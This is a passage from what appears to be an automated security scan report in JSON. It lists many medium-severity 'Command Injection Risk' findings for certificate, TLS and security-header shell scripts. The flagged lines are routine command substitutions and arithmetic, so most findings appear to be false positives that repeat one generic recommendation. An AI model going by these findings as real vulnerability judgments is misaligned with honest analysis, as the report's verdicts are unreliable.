        "evidence": "expiry_date=$(openssl x509 -in \"$cert_file\" -noout -enddate | cut -d= -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
        "line_number": 349,
        "issue": "Command substitution in shell",
        "evidence": "expiry_epoch=$(date -d \"$expiry_date\" +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
        "line_number": 350,
        "issue": "Command substitution in shell",
        "evidence": "now_epoch=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
        "line_number": 351,
        "issue": "Command substitution in shell",
        "evidence": "days_remaining=$(( (expiry_epoch - now_epoch) / 86400 ))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 235,
        "issue": "Command substitution in shell",
        "evidence": "result=$(printf '{\"host\":\"%s\",\"port\":%d,\"status\":\"error\",\"error\":\"Connection failed\"}' \"$host\" \"$port\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 242,
        "issue": "Command substitution in shell",
        "evidence": "not_before=$(echo \"$cert_info\" | grep \"notBefore=\" | cut -d= -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 243,
        "issue": "Command substitution in shell",
        "evidence": "not_after=$(echo \"$cert_info\" | grep \"notAfter=\" | cut -d= -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 244,
        "issue": "Command substitution in shell",
        "evidence": "subject=$(echo \"$cert_info\" | grep \"subject=\" | cut -d= -f2-)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 245,
        "issue": "Command substitution in shell",
        "evidence": "issuer=$(echo \"$cert_info\" | grep \"issuer=\" | cut -d= -f2-)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 249,
        "issue": "Command substitution in shell",
        "evidence": "expiry_epoch=$(date -d \"$not_after\" +%s 2>/dev/null || date -j -f \"%b %d %T %Y %Z\" \"$not_after\" +%s 2>/dev/null)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 250,
        "issue": "Command substitution in shell",
        "evidence": "now_epoch=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 251,
        "issue": "Command substitution in shell",
        "evidence": "days_remaining=$(( (expiry_epoch - now_epoch) / 86400 ))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 321,
        "issue": "Command substitution in shell",
        "evidence": "result=$(printf '{\"file\":\"%s\",\"status\":\"error\",\"error\":\"File not found\"}' \"$cert_file\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 328,
        "issue": "Command substitution in shell",
        "evidence": "if ! cert_info=$(openssl x509 -in \"$cert_file\" -noout -dates -subject -issuer 2>/dev/null); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 329,
        "issue": "Command substitution in shell",
        "evidence": "result=$(printf '{\"file\":\"%s\",\"status\":\"error\",\"error\":\"Invalid certificate\"}' \"$cert_file\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 336,
        "issue": "Command substitution in shell",
        "evidence": "not_before=$(echo \"$cert_info\" | grep \"notBefore=\" | cut -d= -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 337,
        "issue": "Command substitution in shell",
        "evidence": "not_after=$(echo \"$cert_info\" | grep \"notAfter=\" | cut -d= -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 338,
        "issue": "Command substitution in shell",
        "evidence": "subject=$(echo \"$cert_info\" | grep \"subject=\" | cut -d= -f2-)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 339,
        "issue": "Command substitution in shell",
        "evidence": "issuer=$(echo \"$cert_info\" | grep \"issuer=\" | cut -d= -f2-)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 343,
        "issue": "Command substitution in shell",
        "evidence": "expiry_epoch=$(date -d \"$not_after\" +%s 2>/dev/null || date -j -f \"%b %d %T %Y %Z\" \"$not_after\" +%s 2>/dev/null)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 344,
        "issue": "Command substitution in shell",
        "evidence": "now_epoch=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 345,
        "issue": "Command substitution in shell",
        "evidence": "days_remaining=$(( (expiry_epoch - now_epoch) / 86400 ))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 425,
        "issue": "Command substitution in shell",
        "evidence": "\"timestamp\": \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 429,
        "issue": "Command substitution in shell",
        "evidence": "[[ $i -lt $((${#ALERTS[@]} - 1)) ]] && echo \",\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 479,
        "issue": "Command substitution in shell",
        "evidence": "[[ $i -lt $((${#RESULTS[@]} - 1)) ]] && echo \",\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 491,
        "issue": "Command substitution in shell",
        "evidence": "host=$(echo \"$result\" | grep -o '\"host\":\"[^\"]*\"' | cut -d'\"' -f4)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 492,
        "issue": "Command substitution in shell",
        "evidence": "port=$(echo \"$result\" | grep -o '\"port\":[0-9]*' | grep -o '[0-9]*')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 493,
        "issue": "Command substitution in shell",
        "evidence": "days=$(echo \"$result\" | grep -o '\"days_remaining\":[0-9-]*' | grep -o '[0-9-]*$')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 494,
        "issue": "Command substitution in shell",
        "evidence": "status=$(echo \"$result\" | grep -o '\"status\":\"[^\"]*\"' | cut -d'\"' -f4)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 510,
        "issue": "Command substitution in shell",
        "evidence": "printf \"Timestamp: %s\\n\" \"$(date -u +\"%Y-%m-%d %H:%M:%S UTC\")\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 515,
        "issue": "Command substitution in shell",
        "evidence": "printf \"%-40s %-10s %-15s %-25s\\n\" \"$(printf '%0.s-' {1..40})\" \"$(printf '%0.s-' {1..10})\" \"$(printf '%0.s-' {1..15})\" \"$(printf '%0.s-' {1..25})\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/signing-verification/resources/examples/sigstore-cosign-container.sh",
        "line_number": 147,
        "issue": "Command substitution in shell",
        "evidence": "$(sed 's/^/            /' cosign.pub)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/signing-verification/resources/examples/sigstore-cosign-container.sh",
        "line_number": 178,
        "issue": "Command substitution in shell",
        "evidence": "-a \"timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 8,
        "issue": "Command substitution in shell",
        "evidence": "SCRIPT_NAME=$(basename \"$0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 105,
        "issue": "Command substitution in shell",
        "evidence": "content=$(cat \"$file\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 192,
        "issue": "Command substitution in shell",
        "evidence": "max_age=$(echo \"$content\" | grep -o \"max-age=[0-9]*\" | head -1 | cut -d= -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 233,
        "issue": "Command substitution in shell",
        "evidence": "content=$(cat \"$file\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 323,
        "issue": "Command substitution in shell",
        "evidence": "\"timestamp\": \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 328,
        "issue": "Command substitution in shell",
        "evidence": "\"total\": $((PASSED + WARNINGS + ERRORS))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 330,
        "issue": "Command substitution in shell",
        "evidence": "\"status\": \"$(if [[ $ERRORS -eq 0 ]]; then echo \"pass\"; else echo \"fail\"; fi)\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 331,
        "issue": "Command substitution in shell",
        "evidence": "\"grade\": \"$(if [[ $ERRORS -eq 0 ]] && [[ $WARNINGS -eq 0 ]]; then echo \"A+\"; elif [[ $ERRORS -eq 0 ]]; then echo \"B\"; else echo \"C\"; fi)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 389,
        "issue": "Command substitution in shell",
        "evidence": "SERVER_TYPE=$(detect_server_type \"$CONFIG_FILE\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/vulnerability-assessment/resources/scripts/scan_dependencies.sh",
        "line_number": 55,
        "issue": "Command substitution in shell",
        "evidence": "echo '  \"scan_date\": \"'$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")'\",' >> \"$OUTPUT_FILE\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 11,
        "issue": "Command substitution in shell",
        "evidence": "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 30,
        "issue": "Command substitution in shell",
        "evidence": "Usage: $(basename \"$0\") [OPTIONS] <url1> [url2 ...]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 46,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") https://example.com",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 49,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") example.com example.org example.net",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 52,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") -f domains.txt",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 55,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --output json example.com > results.json",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 58,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --compare staging.example.com production.example.com",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 61,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") -j 10 -v -f domains.txt",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 125,
        "issue": "Command substitution in shell",
        "evidence": "if ! response=$(curl \"${curl_opts[@]}\" \"$url\" 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 132,
        "issue": "Command substitution in shell",
        "evidence": "http_code=$(echo \"$response\" | grep \"^HTTP_CODE:\" | cut -d: -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 135,
        "issue": "Command substitution in shell",
        "evidence": "redirect_url=$(echo \"$response\" | grep \"^REDIRECT_URL:\" | cut -d: -f2- || echo \"$url\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 139,
        "issue": "Command substitution in shell",
        "evidence": "strict_transport_security=$(echo \"$response\" | grep -i \"^strict-transport-security:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 142,
        "issue": "Command substitution in shell",
        "evidence": "content_security_policy=$(echo \"$response\" | grep -i \"^content-security-policy:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 145,
        "issue": "Command substitution in shell",
        "evidence": "x_frame_options=$(echo \"$response\" | grep -i \"^x-frame-options:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 148,
        "issue": "Command substitution in shell",
        "evidence": "x_content_type_options=$(echo \"$response\" | grep -i \"^x-content-type-options:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 151,
        "issue": "Command substitution in shell",
        "evidence": "referrer_policy=$(echo \"$response\" | grep -i \"^referrer-policy:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 154,
        "issue": "Command substitution in shell",
        "evidence": "permissions_policy=$(echo \"$response\" | grep -i \"^permissions-policy:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 157,
        "issue": "Command substitution in shell",
        "evidence": "feature_policy=$(echo \"$response\" | grep -i \"^feature-policy:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 160,
        "issue": "Command substitution in shell",
        "evidence": "x_xss_protection=$(echo \"$response\" | grep -i \"^x-xss-protection:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 168,
        "issue": "Command substitution in shell",
        "evidence": "score=$((score + 20))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 173,
        "issue": "Command substitution in shell",
        "evidence": "score=$((score + 30))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 178,
        "issue": "Command substitution in shell",
        "evidence": "score=$((score + 15))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 183,
        "issue": "Command substitution in shell",
        "evidence": "score=$((score + 15))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 188,
        "issue": "Command substitution in shell",
        "evidence": "score=$((score + 10))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 193,
        "issue": "Command substitution in shell",
        "evidence": "score=$((score + 10))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 222,
        "issue": "Command substitution in shell",
        "evidence": "\"strict_transport_security\": $(if [ -n \"$strict_transport_security\" ]; then echo \"\\\"$strict_transport_security\\\"\"; else echo \"null\"; fi),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 223,
        "issue": "Command substitution in shell",
        "evidence": "\"content_security_policy\": $(if [ -n \"$content_security_policy\" ]; then echo \"\\\"$content_security_policy\\\"\"; else echo \"null\"; fi),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 224,
        "issue": "Command substitution in shell",
        "evidence": "\"x_frame_options\": $(if [ -n \"$x_frame_options\" ]; then echo \"\\\"$x_frame_options\\\"\"; else echo \"null\"; fi),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 225,
        "issue": "Command substitution in shell",
        "evidence": "\"x_content_type_options\": $(if [ -n \"$x_content_type_options\" ]; then echo \"\\\"$x_content_type_options\\\"\"; else echo \"null\"; fi),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 226,
        "issue": "Command substitution in shell",
        "evidence": "\"referrer_policy\": $(if [ -n \"$referrer_policy\" ]; then echo \"\\\"$referrer_policy\\\"\"; else echo \"null\"; fi),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 227,
        "issue": "Command substitution in shell",
        "evidence": "\"permissions_policy\": $(if [ -n \"$permissions_policy\" ]; then echo \"\\\"$permissions_policy\\\"\"; else echo \"null\"; fi),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 228,
        "issue": "Command substitution in shell",
        "evidence": "\"feature_policy\": $(if [ -n \"$feature_policy\" ]; then echo \"\\\"$feature_policy\\\"\"; else echo \"null\"; fi),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 229,
        "issue": "Command substitution in shell",
        "evidence": "\"x_xss_protection\": $(if [ -n \"$x_xss_protection\" ]; then echo \"\\\"$x_xss_protection\\\"\"; else echo \"null\"; fi)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 242,
        "issue": "Command substitution in shell",
        "evidence": "echo \"\\\"$url\\\",\\\"$grade\\\",$score,$([ -n \"$strict_transport_security\" ] && echo \"Yes\" || echo \"No\"),$([ -n \"$content_security_policy\" ] && echo \"Yes\" || echo \"No\"),$([ -n \"$x_frame_options\" ] && echo \"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 255,
        "issue": "Command substitution in shell",
        "evidence": "[$([ -n \"$strict_transport_security\" ] && echo \"\u2713\" || echo \"\u2717\")] Strict-Transport-Security",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 258,
        "issue": "Command substitution in shell",
        "evidence": "[$([ -n \"$content_security_policy\" ] && echo \"\u2713\" || echo \"\u2717\")] Content-Security-Policy",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 261,
        "issue": "Command substitution in shell",
        "evidence": "[$([ -n \"$x_frame_options\" ] && echo \"\u2713\" || echo \"\u2717\")] X-Frame-Options",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 264,
        "issue": "Command substitution in shell",
        "evidence": "[$([ -n \"$x_content_type_options\" ] && echo \"\u2713\" || echo \"\u2717\")] X-Content-Type-Options",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 267,
        "issue": "Command substitution in shell",
        "evidence": "[$([ -n \"$referrer_policy\" ] && echo \"\u2713\" || echo \"\u2717\")] Referrer-Policy",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 270,
        "issue": "Command substitution in shell",
        "evidence": "[$([ -n \"$permissions_policy\" ] && echo \"\u2713\" || echo \"\u2717\")] Permissions-Policy",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 273,
        "issue": "Command substitution in shell",
        "evidence": "[$([ -n \"$feature_policy\" ] && echo \"\u2713\" || echo \"\u2717\")] Feature-Policy (deprecated)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 276,
        "issue": "Command substitution in shell",
        "evidence": "[$([ -n \"$x_xss_protection\" ] && echo \"\u2713\" || echo \"\u2717\")] X-XSS-Protection",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 307,
        "issue": "Command substitution in shell",
        "evidence": "echo \"$(echo \"$header\" | tr '[:lower:]' '[:upper:]' | tr '-' ' '):\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 316,
        "issue": "Command substitution in shell",
        "evidence": "response=$(curl -s -I -L --max-time \"$TIMEOUT\" \"$url\" 2>&1 || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 319,
        "issue": "Command substitution in shell",
        "evidence": "value=$(echo \"$response\" | grep -i \"^$header:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
